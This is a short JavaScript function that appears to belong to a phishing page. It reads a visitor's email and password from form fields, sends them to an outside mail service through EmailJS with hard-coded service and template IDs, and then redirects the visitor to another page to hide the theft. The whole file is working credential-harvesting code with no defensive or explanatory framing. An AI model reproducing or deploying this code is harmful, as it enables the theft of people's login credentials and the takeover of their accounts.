
function sendMail () {

    var params = {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value
    }
    const serviceID = "service_rtcxsrg";
    const templateID = "template_wqg0u7o"
    
    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            window.location.href = "index01.html"
            console.log(res)
        })
        .catch((err) => console.log(err))
}
